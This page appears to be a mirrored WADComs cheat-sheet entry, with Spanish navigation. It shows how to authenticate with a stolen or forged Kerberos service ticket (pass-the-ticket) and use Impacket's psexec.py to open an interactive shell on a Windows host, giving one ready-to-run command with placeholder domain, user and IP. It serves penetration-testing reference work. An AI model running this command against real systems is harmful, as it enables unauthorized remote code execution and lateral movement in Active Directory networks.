# WADComs: Impacket-PsExec-PassTheTicket

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `TGS`, `Username`

**Sistema:** `Linux`, `Windows`

## Descripción

Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. psexec.py also allows using Service Tickets, saved as a ccache file for Authentication. It can be obtained via Impacket's GetST.py

Command Reference:

	Target IP: 10.10.10.1

	Domain: test.local

	Username: john

## Comando

```bash
export KRB5CCNAME=/full/path/to/john.ccache; python3 psexec.py test.local/john@10.10.10.1 -k -no-pass
```

## Referencias

- https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
- https://www.sans.org/blog/psexec-python-rocks/
- https://book.hacktricks.xyz/windows/active-directory-methodology/pass-the-ticket#pass-the-ticket-attack
